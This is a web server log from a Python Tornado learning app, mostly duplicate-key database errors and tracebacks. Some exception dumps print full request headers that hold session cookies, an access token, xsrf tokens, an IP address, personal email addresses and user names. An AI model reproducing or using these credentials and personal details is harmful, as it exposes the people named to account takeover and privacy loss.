  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "dpmason@me.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "dpmason@me.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "dpmason@me.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "dpmason@me.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "dpmason@me.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "dpmason@me.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "dpmason@me.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "dpmason@me.com" })
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Traceback (most recent call last):
  File "/usr/lib/python2.7/logging/__init__.py", line 846, in emit
    msg = self.format(record)
  File "/usr/lib/python2.7/logging/__init__.py", line 723, in format
    return fmt.format(record)
  File "/usr/lib/python2.7/logging/__init__.py", line 464, in format
    record.message = record.getMessage()
  File "/usr/lib/python2.7/logging/__init__.py", line 328, in getMessage
    msg = msg % self.args
TypeError: not all arguments converted during string formatting
Logged from file user.py, line 61
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user George Eracleous has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user George Eracleous has successfully logged in.
ERROR:root:500 GET /logout (127.0.0.1) 76.18ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user George Eracleous has successfully logged in.
ERROR:root:500 GET /logout (127.0.0.1) 135.34ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user George Eracleous has successfully logged in.
WARNING:root:404 GET /admin/logs (127.0.0.1) 1.25ms
WARNING:root:404 GET /admin/logs (127.0.0.1) 1.45ms
WARNING:root:404 GET /admin/logs (127.0.0.1) 0.75ms
Facebook user Matt Clifford has successfully logged in.
INFO:intheory-8001:Facebook user Matt Clifford has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user George Eracleous has successfully logged in.
Facebook user George Eracleous has successfully logged in.
INFO:intheory-8001:Facebook user George Eracleous has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user George Eracleous has successfully logged in.
ERROR:root:Uncaught exception POST /learn/hazard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%223.585669994354248%22%2C%224.396576881408691%22%2C%225.499992847442627%22%2C%226.30224609375%22%2C%226.821245193481445%22%2C%227.586616039276123%22%2C%228.342089653015137%22%2C%229.30443286895752%22%2C%2210.300615310668945%22%2C%2211.783254623413086%22%2C%2215.596689224243164%22%2C%2216.621870040893555%22%2C%2220.342601776123047%22%2C%2223.908178329467773%22%2C%2225.6224308013916%22%2C%2226.389829635620117%22%5D&cid=506187888e4c850ad9d5deca&_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '496', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazard', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1348593586|bb76d22f3fa894e0b12852f3b5047750492c7529"; user_type="ZmI=|1348593586|496f9de55e1841900b1e25bc6419adeff29283da"; __utma=188782963.1731359073.1348049186.1348582362.1348592875.10; __utmb=188782963.12.10.1348592875; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 212, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 217, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/learn.py", line 163, in on_success
    u = User.objects(id=uid)
NameError: global name 'User' is not defined
ERROR:root:500 POST /learn/hazard/evaluate (127.0.0.1) 98.50ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
ERROR:root:Uncaught exception POST /learn/hazard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%5D&cid=506187888e4c850ad9d5decc&_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '82', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazard', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1348593586|bb76d22f3fa894e0b12852f3b5047750492c7529"; user_type="ZmI=|1348593586|496f9de55e1841900b1e25bc6419adeff29283da"; __utma=188782963.1731359073.1348049186.1348582362.1348592875.10; __utmb=188782963.13.10.1348592875; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 218, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/learn.py", line 163, in on_success
    utype = self.current_user.user_type
AttributeError: 'FacebookUser' object has no attribute 'user_type'
ERROR:root:500 POST /learn/hazard/evaluate (127.0.0.1) 97.41ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
ERROR:root:Uncaught exception POST /learn/hazard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%5D&cid=506187888e4c850ad9d5decf&_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '82', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazard', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1348593586|bb76d22f3fa894e0b12852f3b5047750492c7529"; user_type="ZmI=|1348593586|496f9de55e1841900b1e25bc6419adeff29283da"; __utma=188782963.1731359073.1348049186.1348582362.1348592875.10; __utmb=188782963.14.10.1348592875; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 218, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/learn.py", line 162, in on_success
    self.current_user.update_points(score)
  File "/www/virtualenv/intheory/src/app/model/user.py", line 28, in update_points
    self.points += points * 100
NameError: global name 'points' is not defined
ERROR:root:500 POST /learn/hazard/evaluate (127.0.0.1) 130.69ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
ERROR:root:Uncaught exception POST /learn/hazard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%5D&cid=506187888e4c850ad9d5decf&_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '82', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/learn/hazard', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1348593586|bb76d22f3fa894e0b12852f3b5047750492c7529"; user_type="ZmI=|1348593586|496f9de55e1841900b1e25bc6419adeff29283da"; __utma=188782963.1731359073.1348049186.1348582362.1348592875.10; 